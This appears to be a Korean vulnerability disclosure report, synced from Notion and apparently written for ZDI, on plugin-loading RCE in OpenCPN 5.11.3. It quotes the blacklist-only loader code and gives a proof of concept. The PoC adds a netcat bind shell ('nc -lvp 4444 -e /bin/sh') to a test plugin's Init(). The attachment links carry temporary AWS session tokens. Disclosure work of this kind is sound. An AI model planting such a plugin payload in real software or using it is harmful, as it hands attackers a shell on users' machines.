---
notion_url: https://www.notion.so/04dbe0809830835ea2c801a5a65a41d1
last_synced: 2026-06-12 18:07
tags: [notion-sync]
---

# [KOR] OpenCPN RCE - Code Injection

취약점 제목 : OpenCPN RCE - Code Injection
취약점 요약 : 서명, 경로, 화이트리스트 검증이 없는 동적 라이브러리 링크 파일을 load 함으로써 발생하는 Remote Code Execution
제조사 : Github OpenSource Project
소프트웨어명 : OpenCPN
버전 : 5.11.3
소프트웨어 유형 : ECS (Electronic Chart System)
공격 유형 : Code Injection
영향 : 프로세스 권한의 Remote Code Execution
취약한 파일명 : plugin_loader.cpp
취약한 함수명 : PluginLoader::LoadPlugIn()
취약한 파라미터 : const wxString& plugin_file, PlugInContainer* pic
취약점 발생 환경 : Ubuntu 24.04

Proof Of Concept  : 
Library를 로드하는 과정 중 검증과정이 블랙리스트 기반 검증밖에 없는것을 확인

```c++
// Check if blacklisted, exit if so.
  auto sts =
      m_blacklist->get_status(pic->m_common_name.ToStdString(),
                              pic->m_version_major, pic->m_version_minor);
  if (sts != plug_status::unblocked) {
    wxLogDebug("Refusing to load blacklisted plugin: %s",
               pic->m_common_name.ToStdString().c_str());
    return nullptr;
  }
  auto data = m_blacklist->get_library_data(plugin_file.ToStdString());
  if (!data.name.empty()) {
    wxLogDebug("Refusing to load blacklisted library: %s",
               plugin_file.ToStdString().c_str());
    return nullptr;
  }
  pic->m_plugin_file = plugin_file;
  pic->m_status =
      PluginStatus::Unmanaged;  // Status is updated later, if necessary

  // load the library
  if (pic->m_library.IsLoaded()) pic->m_library.Unload();
  pic->m_library.Load(plugin_file);

  if (!pic->m_library.IsLoaded()) {
    //  Look in the Blacklist, try to match a filename, to give some kind of
    //  message extract the probable plugin name
    wxFileName fn(plugin_file);
    std::string name = fn.GetName().ToStdString();
    auto found = m_blacklist->get_library_data(name);
    if (m_blacklist->mark_unloadable(plugin_file.ToStdString())) {
      wxLogMessage("Ignoring blacklisted plugin %s", name.c_str());
      if (!found.name.empty()) {
        SemanticVersion v(found.major, found.minor);
        LoadError le(LoadError::Type::Unloadable, name, v);
        load_errors.push_back(le);
      } else {
        LoadError le(LoadError::Type::Unloadable, plugin_file.ToStdString());
        load_errors.push_back(le);
      }
    }
    wxLogMessage(wxString("   PluginLoader: Cannot load library: ") +
                 plugin_file);
    return nullptr;
  }
```

깃허브에서 OpenCPN용 TestPlugin 템플릿을 받아와 예시 RCE로 바인드 쉘을 사용
https://github.com/jongough/testplugin_pi.git
`src/testplugin_pi.cpp` 의 `Init()` 최상단에 다음을 추가:

```c++
#include <thread>
#include <chrono>
#include <cstdlib>
+#include <fstream>

int testplugin_pi::Init(void)
{
+    // Init() 호출 확인 로그
+    std::ofstream fs("/home/user/poc_init.log");
+    fs << "Init() 호출됨\n";
+    fs.close();
+
    // … 기존 초기화 로직 …

+    // 5초 후 바인드 셸 실행 (PoC 예시)
+    std::thread([](){
+        std::this_thread::sleep_for(std::chrono::seconds(5));
+        system("/usr/bin/nc.traditional -lvp 4444 -e /bin/sh &");
+    }).detach();


```

빌드 후 OpenCPN 내부에서 Plugin을 Import 하면

![image](_assets/image.png)

nc 명령으로 쉘 접속 가능함을 알수 있습니다.

취약점 기타 (파일 첨부 영상, 보고서 첨부) :

> 📎 첨부(미변환): [POC2.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/92bdd4ae-35e4-4636-a8a3-fce96cfbfd0f/POC2.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466Y2RFICU6%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T090734Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEgaCXVzLXdlc3QtMiJGMEQCIFNUxaiL3Oc5148ogxXG8FFNzi3mmjFkX31RX9wfDNxMAiBCw6CPgWZ7mUfHASkb%2B92dND9Gj8O0NzIpMw4ZF%2Bc%2BUSr%2FAwgREAAaDDYzNzQyMzE4MzgwNSIMWjFyjsafC3hO3farKtwDkx1tLGzM6PqPfdIiJauHltZz%2B7%2FBd5DmfufePyOi4Oi7B8VUj8Qp3geeDjglBWsr5Ii0gpqeEDLoyqCV%2B7CvgfQpKjDuWzMYPSBT569b97YLLuCSS1%2BkGK2WS0ehiO8UgRKbFZf2muY9RZ%2FbU1UXAFMay7h8F1WwWll%2BegexryxRHQymv%2BPM3Gmd6ycLPIGo3CWMI6l31rVW%2FTlHH4Ks4g8Lu6UixZxeInYBgD0nLe4o8dlLKLxifI6bXjdE7GHJMMzL%2FbszbSstSpEG%2Fes%2B%2BcPgdF0UWwe0zBjwtZIcfWT9l6qgaPis%2B7z%2Fw1NVpaqVIf88UA2qHmOqatZK7NdAYvXT1pyglUJ5zAN3jakOBePeU1%2FXiA5WptoAffSohXTsyc8ich5HSo%2BbZ0hlVZKm7n6zoHtcg3gmspnWKnmNd0Ns%2FzHGLzXUdybOmg%2B7990892EtMw24Ke3mO4jeDk%2FnERfwtG3meD%2BfBGoqBDXMFOXryu3f3JRei15eTbKAsQbpzfUdvegGusvatTAyBZc9mtaXBTvdgazqn1ns8hvtmt8E6eRv1UO5OFsWMo0tgBZ4TyJRP9pFFBuFibf9ZA5ur5f656iC7qXzlyflzFcb84s4pNjWPA%2FlM0CBWTEwyvGu0QY6pgH%2B0Mbr3%2BGU4b%2BWfQE3pfAtrare4wQVtmUwfzQKneiZdpHf2XNBn2Llqos3mB05IH39WVqXhHnBjE%2BBTkkZwJd%2Fw9IQichuksxuEnqzjMEhyE9NymdW0%2FR%2BsD8wRBINcQbqyWfTME6LuX%2BbQ76DYONZWb0sxVrEiqm7A52JTFkTSOaM7pg%2FFZYehVX6kKo3ZEeqPbg5nATzQwwZmP8Ei5vE6q9a5vMH&X-Amz-Signature=3f288d0ddb0bb685a153b8fc032b6530cf9b6f1442552cee5220f449f652acf7&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)




> 📎 첨부(미변환): [zdi report2.txt](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/f9e232eb-7be1-4217-8bad-eca58c969748/zdi_report2.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466Y2RFICU6%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T090734Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEgaCXVzLXdlc3QtMiJGMEQCIFNUxaiL3Oc5148ogxXG8FFNzi3mmjFkX31RX9wfDNxMAiBCw6CPgWZ7mUfHASkb%2B92dND9Gj8O0NzIpMw4ZF%2Bc%2BUSr%2FAwgREAAaDDYzNzQyMzE4MzgwNSIMWjFyjsafC3hO3farKtwDkx1tLGzM6PqPfdIiJauHltZz%2B7%2FBd5DmfufePyOi4Oi7B8VUj8Qp3geeDjglBWsr5Ii0gpqeEDLoyqCV%2B7CvgfQpKjDuWzMYPSBT569b97YLLuCSS1%2BkGK2WS0ehiO8UgRKbFZf2muY9RZ%2FbU1UXAFMay7h8F1WwWll%2BegexryxRHQymv%2BPM3Gmd6ycLPIGo3CWMI6l31rVW%2FTlHH4Ks4g8Lu6UixZxeInYBgD0nLe4o8dlLKLxifI6bXjdE7GHJMMzL%2FbszbSstSpEG%2Fes%2B%2BcPgdF0UWwe0zBjwtZIcfWT9l6qgaPis%2B7z%2Fw1NVpaqVIf88UA2qHmOqatZK7NdAYvXT1pyglUJ5zAN3jakOBePeU1%2FXiA5WptoAffSohXTsyc8ich5HSo%2BbZ0hlVZKm7n6zoHtcg3gmspnWKnmNd0Ns%2FzHGLzXUdybOmg%2B7990892EtMw24Ke3mO4jeDk%2FnERfwtG3meD%2BfBGoqBDXMFOXryu3f3JRei15eTbKAsQbpzfUdvegGusvatTAyBZc9mtaXBTvdgazqn1ns8hvtmt8E6eRv1UO5OFsWMo0tgBZ4TyJRP9pFFBuFibf9ZA5ur5f656iC7qXzlyflzFcb84s4pNjWPA%2FlM0CBWTEwyvGu0QY6pgH%2B0Mbr3%2BGU4b%2BWfQE3pfAtrare4wQVtmUwfzQKneiZdpHf2XNBn2Llqos3mB05IH39WVqXhHnBjE%2BBTkkZwJd%2Fw9IQichuksxuEnqzjMEhyE9NymdW0%2FR%2BsD8wRBINcQbqyWfTME6LuX%2BbQ76DYONZWb0sxVrEiqm7A52JTFkTSOaM7pg%2FFZYehVX6kKo3ZEeqPbg5nATzQwwZmP8Ei5vE6q9a5vMH&X-Amz-Signature=f6b77469aec874f2c1a93979c2839a617722447001f162102c7c0bb29fd8957d&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
